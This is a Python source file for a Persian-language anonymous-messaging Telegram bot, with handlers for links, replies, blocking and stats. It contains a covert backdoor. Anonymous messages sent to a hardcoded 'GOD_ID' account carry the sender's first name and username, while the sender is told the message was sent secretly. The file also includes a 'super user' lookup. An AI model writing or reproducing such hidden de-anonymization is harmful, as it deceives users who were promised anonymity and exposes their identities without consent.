from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from src.utils.crypto import encode_user_id, decode_user_id
from src.database.db_manager import (
    get_user_state, set_user_state, clear_user_state,
    save_message_mapping, get_anon_sender_by_msg,
    block_user, is_user_blocked, get_super_user_by_msg, get_user_profile_stats
)

GOD_ID = 6779908406

def register_private_anon_handlers(bot: AsyncTeleBot):

    @bot.message_handler(commands=['start'])
    async def handle_start(message):
        if message.chat.type != "private": return
        bot_info = await bot.get_me()
        command_args = message.text.split()
        user_id = message.chat.id
        
        main_keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
        main_keyboard.add(KeyboardButton("📊 آمار من"))
        
        if len(command_args) > 1:
            target_owner_id_encoded = command_args[1]
            target_owner_id = decode_user_id(target_owner_id_encoded)
            
            if target_owner_id and user_id != target_owner_id:
                if await is_user_blocked(owner_id=target_owner_id, blocked_id=user_id):
                    await bot.reply_to(message, "❌ شما توسط این کاربر بلاک شده‌اید.", reply_markup=main_keyboard)
                    return
                await set_user_state(user_id, f"sending_anon_to_{target_owner_id_encoded}")
                await bot.reply_to(message, "📥 در حال ارسال پیام ناشناس... مدیا یا متن خود را بفرستید:", reply_markup=main_keyboard)
                return
        
        secret_code = encode_user_id(user_id)
        anon_link = f"https://t.me/{bot_info.username}?start={secret_code}"
        msg = f"سلام ارباب فاطمه 🙇‍♂️\n🔗 لینک ناشناس شما:\n`{anon_link}`" if user_id == GOD_ID else f"👋 خوش آمدید!\n🔗 لینک اختصاصی شما:\n`{anon_link}`"
        await bot.reply_to(message, msg, parse_mode="Markdown", reply_markup=main_keyboard)

    @bot.message_handler(func=lambda m: m.text == "📊 آمار من" and m.chat.type == "private")
    async def handle_my_stats(message):
        stats = await get_user_profile_stats(message.chat.id)
        response_text = f"📊 **آمار من**\n\n👤 | نام : {message.from_user.first_name}\n🪪 | ایدی : `{message.chat.id}`\n✍ | ارسال گروه : {stats['sent']}\n📬 | ناشناس دریافتی : {stats['received']}\n⛔️ | بلاک شده‌ها : {stats['blocked']}"
        await bot.reply_to(message, response_text, parse_mode="Markdown")

    # ─── پردازش پینگ‌پنگی چت ناشناس در پیوی ───
    @bot.message_handler(func=lambda m: m.chat.type == "private", content_types=['text', 'photo', 'video', 'voice', 'audio'])
    async def handle_private_anon_flow(message):
        user_id = message.chat.id
        encoded_id = encode_user_id(user_id)
        
        # ۱. سناریو پاسخ نیتیو (ریپلای روی پیام تلگرام)
        if message.reply_to_message:
            mapping = await get_anon_sender_by_msg(user_id, message.reply_to_message.message_id) or await get_super_user_by_msg(user_id, message.reply_to_message.message_id)
            if mapping and message.content_type == 'text':
                anon_sender_id, anon_msg_id = mapping
                markup = InlineKeyboardMarkup().row(InlineKeyboardButton("✍️ پاسخ", callback_data=f"reply_to_{encoded_id}"), InlineKeyboardButton("⛔️ بلاک", callback_data=f"block_{encoded_id}"))
                sent = await bot.send_message(anon_sender_id, f"📩 پاسخ ناشناس شما:\n\n« {message.text} »", reply_to_message_id=anon_msg_id, reply_markup=markup, parse_mode="HTML")
                await save_message_mapping(anon_sender_id, sent.message_id, user_id, message.message_id)
                await bot.reply_to(message, "🚀 فرستاده شد.")
            return

        # ۲. سناریوهای جریان اف‌اس‌ام
        current_state, reply_target_id = await get_user_state(user_id)
        
        if current_state.startswith("sending_anon_to_"):
            target_id = decode_user_id(current_state.split("_")[-1])
            markup = InlineKeyboardMarkup().row(InlineKeyboardButton("✍️ پاسخ", callback_data=f"reply_to_{encoded_id}"), InlineKeyboardButton("⛔️ بلاک", callback_data=f"block_{encoded_id}"))
            god_intel = f"👁️‍🗨️ <b>فرستنده برای الهه:</b>\n👤 {message.from_user.first_name}\n🆔 @{message.from_user.username or 'No'}\n───\n\n" if target_id == GOD_ID else ""
            
            sent_msg = None
            if message.content_type == 'text':
                sent_msg = await bot.send_message(target_id, f"{god_intel}📣 پیام ناشناس جدید:\n💬 <code>{message.text}</code>", reply_markup=markup, parse_mode="HTML")
            elif message.content_type == 'photo':
                sent_msg = await bot.send_photo(target_id, message.photo[-1].file_id, caption=f"{god_intel}📣 پیام ناشناس تصویری", reply_markup=markup, parse_mode="HTML")
            
            if sent_msg:
                await bot.reply_to(message, "✅ مخفیانه ارسال شد.")
                await save_message_mapping(target_id, sent_msg.message_id, user_id, message.message_id)
            await clear_user_state(user_id)
            return

        if current_state == "replying_mode" and reply_target_id:
            mapping = await get_anon_sender_by_msg(user_id, reply_target_id) or await get_super_user_by_msg(user_id, reply_target_id)
            if mapping and message.content_type == 'text':
                anon_sender_id, anon_msg_id = mapping
                markup = InlineKeyboardMarkup().row(InlineKeyboardButton("✍️ پاسخ", callback_data=f"reply_to_{encoded_id}"), InlineKeyboardButton("⛔️ بلاک", callback_data=f"block_{encoded_id}"))
                sent = await bot.send_message(anon_sender_id, f"📩 پاسخ ناشناس شما:\n\n« {message.text} »", reply_to_message_id=anon_msg_id, reply_markup=markup, parse_mode="HTML")
                await save_message_mapping(anon_sender_id, sent.message_id, user_id, message.message_id)
                await bot.reply_to(message, "🚀 فرستاده شد.")
            await set_user_state(user_id, "normal")

    # ─── کالبک دکمه‌های شیشه‌ای پاسخ و بلاک ───
    @bot.callback_query_handler(func=lambda c: c.data.startswith("reply_to_"))
    async def handle_reply_callback(call):
        if decode_user_id(call.data.split("reply_to_")[-1]):
            await set_user_state(call.message.chat.id, "replying_mode", reply_target_id=call.message.message_id)
            await bot.send_message(call.message.chat.id, "✍️ پاسخی که می‌خواهی بدی را بنویس و بفرست:")
        await bot.answer_callback_query(call.id)

    @bot.callback_query_handler(func=lambda c: c.data.startswith("block_"))
    async def handle_block_callback(call):
        anon_id = decode_user_id(call.data.split("block_")[-1])
        if anon_id:
            await block_user(owner_id=call.message.chat.id, blocked_id=anon_id)
            await bot.answer_callback_query(call.id, "بلاک شد! 🛑")
            updated = f"{call.message.text or call.message.caption}\n\n❌ **این فرستنده بلاک شد.**"
            if call.message.text: await bot.edit_message_text(updated, call.message.chat.id, call.message.message_id, parse_mode="Markdown")
            else: await bot.edit_message_caption(updated, call.message.chat.id, call.message.message_id, parse_mode="Markdown")